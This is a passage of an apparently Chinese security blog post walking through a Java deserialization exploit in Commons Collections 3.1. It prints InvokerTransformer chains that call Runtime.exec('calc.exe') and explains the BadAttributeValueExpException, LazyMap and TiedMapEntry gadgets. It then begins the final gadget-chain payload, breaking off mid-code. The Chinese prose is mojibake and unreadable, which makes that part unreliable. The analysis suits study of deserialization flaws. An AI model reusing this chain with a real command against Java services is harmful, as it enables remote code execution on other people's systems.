Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æµ‹è¯•æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡æ˜¯å¦å¯ä»¥è¢«åºåˆ—åŒ–</span></span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰§è¡Œä»¥ä¸‹è¯­å¥å°±å¯ä»¥è°ƒç”¨èµ·è®¡ç®—å™¨</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åç¨‹åºæ²¡æŠ¥é”™ï¼Œå³è¯¥Transformeré“¾å¯ä»¥è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œ<code>transformerChain.transform(null);</code>æ—¶æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/2.png" alt="payload1"></p><p>è¯¥Transformeré“¾æ²¡æœ‰é—®é¢˜ï¼Œä¸‹é¢å°±æ˜¯æ‰¾Commons Collectionsä¸­å“ªäº›åœ°æ–¹å¯ä»¥æ‰§è¡Œè¯¥Transformeré“¾çš„transform()æ–¹æ³•ä»¥åŠå¯»æ‰¾å«æœ‰è‡ªå®šä¹‰æœ‰æ¼æ´çš„readObject()æ–¹æ³•çš„ç±»äº†ã€‚</p><h3 id="2ã€æŸ¥æ‰¾è‡ªå®šä¹‰readObject-æ–¹æ³•ä¸”å­˜åœ¨æ¼æ´ä»£ç çš„ç±»"><a href="#2ã€æŸ¥æ‰¾è‡ªå®šä¹‰readObject-æ–¹æ³•ä¸”å­˜åœ¨æ¼æ´ä»£ç çš„ç±»" class="headerlink" title="2ã€æŸ¥æ‰¾è‡ªå®šä¹‰readObject()æ–¹æ³•ä¸”å­˜åœ¨æ¼æ´ä»£ç çš„ç±»"></a>2ã€æŸ¥æ‰¾è‡ªå®šä¹‰readObject()æ–¹æ³•ä¸”å­˜åœ¨æ¼æ´ä»£ç çš„ç±»</h3><p>å¦‚ç½‘ä¸Šæ‰€è¯´ï¼Œåœ¨JDKè¾ƒæ—©çš„ç‰ˆæœ¬ä¸­å­˜åœ¨AnnotationInvocationHandlerç±» ï¼Œå…¶ç±»å¯¹è±¡åœ¨åˆå§‹åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ªMapç±»å‹å‚æ•°èµ‹å€¼ç»™å­—æ®µmemberValuesï¼ŒreadObject()è¿‡ç¨‹ä¸­å¦‚æœæ»¡è¶³ä¸€å®šæ¡ä»¶å°±ä¼šå¯¹memberValuesä¸­çš„å…ƒç´ è¿›è¡ŒsetValue()ã€‚</p><p>ä½†æ˜¯ï¼Œåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„JDKä¸­AnnotationInvocationHandleræ²¡æœ‰äº†setValue()æ–¹æ³•ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨BadAttributeValueExpExceptionç±»æ¥å®ç°ã€‚ç”±äºæœ¬åœ°ç¯å¢ƒçš„JDKä¸ºè¾ƒæ–°çš„ç‰ˆæœ¬ï¼Œå› æ­¤å°±åªæš‚æ—¶å¯¹BadAttributeValueExpExceptionç±»è¿›è¡Œåˆ†æã€‚</p><p><strong>BadAttributeValueExpException</strong></p><p>ä¸‹é¢çœ‹ä¸‹BadAttributeValueExpExceptionç±»å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°å®šä¹‰äº†ä¸€ä¸ªåä¸ºvalçš„å¯¹è±¡ç±»å‹å±æ€§ï¼Œä¸”è‡ªå®šä¹‰äº†readObject()æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line">    <span class="comment">/* Serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span> A string representation of the attribute that originated this exception.</span></span><br><span class="line"><span class="comment">     * for example, the string value can be the return of &#123;<span class="doctag">@code</span> attribute.toString()&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">     * create the toString() value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representing the object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è‡ªå®šä¹‰çš„readObejct()æ–¹æ³•ï¼Œå…¶ä¸­åœ¨æ»¡è¶³System.getSecurityManager() == nullæ—¶ä¼šè°ƒç”¨ valObj.toString()ï¼Œä»æ”»å‡»æ€è·¯ä¸Šçœ‹ï¼Œå…¶ä»–çš„æ¡ä»¶éƒ½æ˜¯æ— æ³•æ»¡è¶³çš„ã€‚å› æ­¤valObj.toString()å°±æˆä¸ºäº†çªç ´å£ï¼Œæ­¤æ—¶è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å·¥å…·åœ¨toString()æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ä¼šè§¦å‘æˆ‘ä»¬æ„é€ çš„æ¶æ„ä»£ç ã€‚</p><h3 id="3ã€æŸ¥æ‰¾å¯é€šè¿‡toString-è§¦å‘transform-æ–¹æ³•çš„åˆé€‚çš„ç±»"><a href="#3ã€æŸ¥æ‰¾å¯é€šè¿‡toString-è§¦å‘transform-æ–¹æ³•çš„åˆé€‚çš„ç±»" class="headerlink" title="3ã€æŸ¥æ‰¾å¯é€šè¿‡toString()è§¦å‘transform()æ–¹æ³•çš„åˆé€‚çš„ç±»"></a>3ã€æŸ¥æ‰¾å¯é€šè¿‡toString()è§¦å‘transform()æ–¹æ³•çš„åˆé€‚çš„ç±»</h3><p>ä»BadAttributeValueExpExceptionç±»çš„readObejct()æ–¹æ³•çŸ¥é“ï¼Œå…³æ³¨ç‚¹åœ¨valObj.toString()ä¸­ï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ç±»åœ¨è°ƒç”¨toString()æ–¹æ³•æ—¶è§¦å‘transform()æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„åå°„é“¾ã€‚</p><p><strong>LazyMapâ€”â€”è°ƒç”¨get()æ–¹æ³•è§¦å‘transform()æ–¹æ³•</strong></p><p>LazyMapæ˜¯Commons-collections 3.1æä¾›çš„ä¸€ä¸ªå·¥å…·ç±»ï¼Œæ˜¯Mapçš„ä¸€ä¸ªå®ç°ï¼Œä¸»è¦çš„å†…å®¹æ˜¯åˆ©ç”¨å·¥å‚è®¾è®¡æ¨¡å¼ï¼Œåœ¨ç”¨æˆ·getä¸€ä¸ªä¸å­˜åœ¨çš„keyçš„æ—¶å€™æ‰§è¡Œä¸€ä¸ªæ–¹æ³•æ¥ç”ŸæˆKeyå€¼ï¼Œå½“ä¸”ä»…å½“getè¡Œä¸ºå­˜åœ¨çš„æ—¶å€™Valueæ‰ä¼šè¢«ç”Ÿæˆã€‚å…¶å®šä¹‰ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">this</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LazyMapæµ‹è¯•ä»£ç ï¼Œåœ¨getä¸€ä¸ªä¸å­˜åœ¨çš„keyçš„æ—¶å€™æ‰§è¡Œä¸€ä¸ªæ–¹æ³•æ¥ç”ŸæˆKeyå€¼ï¼Œä¸‹é¢çš„ä»£ç è¿è¡Œç»“æœä¼šè°ƒç”¨transform()è¾“å‡ºâ€Mi1k7eaâ€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map targetMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), <span class="keyword">new</span> Transformer() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(targetMap.get(<span class="string">"hhhhhhhh"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TiedMapEntryâ€”â€”è°ƒç”¨toString()æ–¹æ³•è§¦å‘getValue()æ–¹æ³•ï¼ˆå³LazyMap.get()ï¼‰</strong></p><p>TiedMapEntryä¹Ÿå­˜åœ¨äºCommons-collections 3.1ï¼Œè¯¥ç±»ä¸»è¦çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªMapç»‘å®šåˆ°Map.Entryä¸‹ï¼Œå½¢æˆä¸€ä¸ªæ˜ å°„ã€‚</p><p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot set value to this map entry"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.put(<span class="keyword">this</span>.key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> var10000;</span><br><span class="line">            label43: &#123;</span><br><span class="line">                label29: &#123;</span><br><span class="line">                    Entry other = (Entry)obj;</span><br><span class="line">                    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getKey() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label29;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.key.equals(other.getKey())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label29;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getValue() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label43;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.equals(other.getValue())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label43;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var10000 = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">return</span> var10000;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10000 = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> var10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä¸‹è¿™ä¸ªç±»ï¼Œé¦–å…ˆæ˜¯toString()ä¸­è°ƒç”¨äº†getValue()ï¼Œè€ŒgetValue()ä¸­å®é™…æ˜¯map.get(key)ï¼Œå¦‚æ­¤ä¸€æ¥å°±æ„å»ºèµ·äº†æ•´ä¸ªè°ƒç”¨é“¾æ¥äº†ã€‚</p><h3 id="æ„é€ è¿‡ç¨‹å°ç»“"><a href="#æ„é€ è¿‡ç¨‹å°ç»“" class="headerlink" title="æ„é€ è¿‡ç¨‹å°ç»“"></a>æ„é€ è¿‡ç¨‹å°ç»“</h3><p><strong>BadAttributeValueExpException</strong></p><p>è¿™é‡Œå°†ä¸Šè¿°åˆ†æçš„è°ƒç”¨è¿‡ç¨‹åšä¸ªå›¾æ¸…æ™°åœ°åˆ—å‡ºæ¥ï¼Œç›¸ä¿¡åº”è¯¥å¾ˆæ˜ç¡®è¯¥åå°„é“¾æ‰§è¡Œçš„è¿‡ç¨‹äº†ï¼š</p><p><img src="/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/5.png" alt="demo3"></p><p><strong>æœ€ç»ˆæ„é€ çš„ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span 